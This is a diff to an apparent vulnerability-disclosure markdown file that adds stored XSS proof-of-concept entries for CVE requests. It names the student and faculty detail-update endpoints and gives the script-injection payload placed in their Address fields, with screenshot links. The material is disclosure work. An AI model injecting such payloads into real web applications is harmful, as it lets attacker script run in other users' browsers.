@@ -88,6 +88,7 @@ ___
 ## CVE Request 1928485
 Poc XSS Storage:
 
+- /updatedetailsfromstudent.php?eno=146891650
 - Addres: "><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
 
 <img width="1831" height="847" alt="image" src="https://github.com/user-attachments/assets/acacc85d-9155-4046-a299-ac7dd0b8282e" />
@@ -97,6 +98,21 @@ Poc XSS Storage:
 <img width="1333" height="230" alt="image" src="https://github.com/user-attachments/assets/71ac925f-44ba-42f7-868b-30ba888f6739" />
 
 <img width="1849" height="1203" alt="image" src="https://github.com/user-attachments/assets/aecb003d-8bb0-44fa-bf99-19938947ab33" />
+
+
+___
+## CVE Request 1928493
+Poc XSS Storage:
+- /updatedetailsfromfaculty.php?myfid=101
+- Address : "><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
+
+<img width="1996" height="915" alt="image" src="https://github.com/user-attachments/assets/c51afd63-0020-42b9-9a8e-e027538fa0b2" />
+
+<img width="1373" height="240" alt="image" src="https://github.com/user-attachments/assets/18018db5-ae3f-40e3-b823-0cc02800c03a" />
+
+<img width="1390" height="215" alt="image" src="https://github.com/user-attachments/assets/ff054ac0-aa98-474f-9b33-b90aefd80e9d" />
+
+<img width="1867" height="867" alt="image" src="https://github.com/user-attachments/assets/0c5a819b-ee26-41b0-83f5-ed5da464616a" />
 
 ___
 
